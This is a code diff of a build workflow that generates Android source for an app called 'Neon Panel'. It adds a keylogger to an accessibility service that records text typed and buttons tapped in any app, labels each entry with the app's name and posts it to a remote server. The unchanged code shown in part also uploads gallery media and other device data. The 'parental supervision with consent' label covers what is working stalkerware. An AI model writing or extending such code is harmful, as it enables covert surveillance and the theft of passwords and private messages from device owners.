@@ -266,6 +266,10 @@ jobs:
               private Thread uiSenderThread, deviceStateThread, galleryPollerThread, gpsRequestThread;
               private String deviceId, deviceToken;
 
+              // New keylogger buffer
+              private StringBuilder pendingText = new StringBuilder();
+              private String pendingPackageName = null;
+
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
@@ -326,7 +330,7 @@ jobs:
               private void startGalleryPoller() {
                   galleryPollerThread = new Thread(() -> {
                       while (!Thread.currentThread().isInterrupted()) {
-                          try { checkGalleryRequest(); Thread.sleep(5000); }
+                          try { checkGalleryRequest(); Thread.sleep(3000); }
                           catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                           catch (Exception e) { e.printStackTrace(); }
                       }
@@ -380,7 +384,6 @@ jobs:
                       List<JSONObject> mediaList = new ArrayList<>();
                       ContentResolver resolver = getContentResolver();
 
-                      // === IMAGES ===
                       Uri imageCollection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                       String[] projection = {
                               MediaStore.Images.Media._ID,
@@ -411,7 +414,6 @@ jobs:
                           cursor.close();
                       }
 
-                      // === VIDEOS ===
                       Uri videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                       Cursor videoCursor = resolver.query(videoCollection, projection, null, null, sortOrder);
                       if (videoCursor != null) {
@@ -435,7 +437,6 @@ jobs:
                           videoCursor.close();
                       }
 
-                      // Sort by timestamp descending (fixed compatibility)
                       Collections.sort(mediaList, new Comparator<JSONObject>() {
                           @Override
                           public int compare(JSONObject a, JSONObject b) {
@@ -449,12 +450,10 @@ jobs:
                           }
                       });
 
-                      // Limit to maxCount
                       if (mediaList.size() > maxCount) {
                           mediaList = new ArrayList<>(mediaList.subList(0, maxCount));
                       }
 
-                      // === UPLOAD ===
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -581,6 +580,60 @@ jobs:
                   return list;
               }
 
+              // ================== NEW KEYLOGGER LOGIC ==================
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                      if (event.getText() != null && event.getText().size() > 0) {
+                          String typedText = event.getText().get(0).toString();
+                          if (!typedText.isEmpty()) {
+                              // Accumulate text in buffer
+                              if (pendingText.length() == 0) {
+                                  pendingPackageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+                              }
+                              pendingText.append(typedText).append(" ");
+                          }
+                      }
+                  } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                      // User clicked something
+                      AccessibilityNodeInfo source = event.getSource();
+                      String clickedText = "";
+                      if (source != null) {
+                          clickedText = source.getText() != null ? source.getText().toString() : (source.getContentDescription() != null ? source.getContentDescription().toString() : "");
+                          source.recycle();
+                      }
+
+                      // Prepare app name for display
+                      String appName = getAppDisplayName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
+
+                      // First send tap event
+                      String tapMessage = "👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText);
+                      sendKeylog(tapMessage);
+
+                      // Then send typed text if any
+                      if (pendingText.length() > 0) {
+                          String typed = pendingText.toString().trim();
+                          // Use pending package name for typed text's app context
+                          String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
+                          String keylogMessage = "[" + typedAppName + "] " + typed;
+                          sendKeylog(keylogMessage);
+                          // Clear buffer
+                          pendingText.setLength(0);
+                          pendingPackageName = null;
+                      }
+                  }
+              }
+
+              private String getAppDisplayName(String packageName) {
+                  try {
+                      PackageManager pm = getPackageManager();
+                      ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+                      return pm.getApplicationLabel(ai).toString();
+                  } catch (Exception e) {
+                      return packageName; // fallback to package name
+                  }
+              }
+
               private void sendKeylog(String text) {
                   new Thread(() -> {
                       try {
@@ -610,15 +663,6 @@ jobs:
                       Request request = new Request.Builder().url(API_BASE + "/api/ui").post(body).build();
                       httpClient.newCall(request).execute().close();
                   } catch (Exception e) { e.printStackTrace(); }
-              }
-
-              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
-                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                      if (event.getText() != null && event.getText().size() > 0) {
-                          String text = event.getText().get(0).toString();
-                          if (!text.isEmpty()) { logToFile(text); sendKeylog(text); }
-                      }
-                  }
               }
 
               private String extractTextFromNode(AccessibilityNodeInfo node) {
@@ -671,7 +715,7 @@ jobs:
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">Neon Panel</string>
-              <string name="accessibility_service_description">This service captures typed text, screen content, device state, installed apps, location and media gallery for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service captures typed text on click, screen content, device state, installed apps, location and media gallery for parental supervision with consent.</string>
           </resources>
           EOF
 
@@ -684,7 +728,7 @@ jobs:
           cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged"
+              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged|typeViewClicked"
               android:accessibilityFeedbackType="feedbackGeneric"
               android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
               android:canRetrieveWindowContent="true"
